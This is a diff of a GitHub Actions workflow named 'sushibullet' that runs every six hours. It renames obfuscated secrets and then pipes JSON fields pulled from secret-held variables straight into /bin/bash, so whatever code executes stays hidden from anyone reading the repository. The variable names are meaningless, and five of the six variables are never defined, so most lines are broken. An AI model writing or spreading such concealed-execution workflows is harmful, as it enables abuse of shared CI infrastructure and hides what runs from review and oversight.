@@ -1,21 +1,22 @@
 name: sushibullet
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 3/6 * * *'
+    - cron: '52 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sushibullet
         env:
-          ascj1: ${{ secrets.ascj1 }}
+          lsm5806: ${{ secrets.lsm5806 }}
         run: |
-          echo $ascj1 | jq -r .bnpy1993 | /bin/bash
-          echo $moc581 | jq -r .vf7 | /bin/bash
-          echo $o48 | jq -r .jcs87386 | /bin/bash
-          echo $anwps4797 | jq -r .lj906 | /bin/bash
+          echo $lsm5806 | jq -r .uxn887 | /bin/bash
+          echo $mo8460 | jq -r .mqyn29 | /bin/bash
+          echo $qvb16 | jq -r .vhj71051 | /bin/bash
+          echo $y7464 | jq -r .i1 | /bin/bash
+          echo $rp7 | jq -r .hbm81 | /bin/bash
+          echo $tysr0381 | jq -r .a72 | /bin/bash
 
